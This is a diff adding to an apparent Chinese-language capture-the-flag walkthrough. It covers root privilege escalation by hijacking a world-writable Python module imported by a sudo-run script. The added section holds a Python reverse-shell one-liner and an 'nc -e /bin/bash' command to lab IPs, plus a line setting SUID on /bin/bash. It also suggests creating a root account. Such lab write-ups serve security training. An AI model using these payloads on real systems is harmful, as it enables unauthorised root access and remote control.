@@ -59,6 +59,41 @@ uid=1002(jaba) gid=1002(jaba) groups=1002(jaba)
 $ script /dev/null -c bash
 jaba@jabita:/home/jack$ sudo -l
     (root) NOPASSWD: /usr/bin/python3 /usr/bin/clean.py
+```
+查看这个文件为root 权限，该脚本导入了wild 模块，执行后调用first()方法，输出一个hello。
+我们搜索该模块，查看模块内容如下
+```c
+jaba@jabita:/home/jack$ cat /usr/bin/clean.py 
+import wild
 
+wild.first()
+jaba@jabita:/home/jack$ ls -all /usr/bin/clean.py 
+-rw-r--r-- 1 root root 26 Sep  5  2022 /usr/bin/clean.py
+jaba@jabita:/home/jack$ /usr/bin/python3 /usr/bin/clean.py
+Hello
+jaba@jabita:/home/jack$ find / -type f -name "wild.py" 2>/dev/null
+/usr/lib/python3.10/wild.py
+jaba@jabita:/home/jack$ cat /usr/lib/python3.10/wild.py
+def first():
+        print("Hello")
+jaba@jabita:/home/jack$ ls -all /usr/lib/python3.10/wild.py
+-rw-r--rw- 1 root root 29 Sep  5  2022 /usr/lib/python3.10/wild.py
+```
 
+我们对改文件具有修改的权限，因此可以尝试python库劫持进行提取
+那么接下来我们可以使用python反弹一个shell,代码如下
+```c
+import os
+def first():
+	os.system("python3 -c \"import       os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('192.168.1.158',1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(['/bin/bash','-i']);\"")
+
+os.system("nc -e /bin/bash 192.168.44.128 9000")
+```
+
+实战中，如果机器不出网，我们可以修改该脚本的内容，让它可以使用 SUID 执行 bash。或者直接创建一个root权限的账号。
+
+```c
+import os
+def first():	
+	os.system("chmod u+s /bin/bash")
 ```
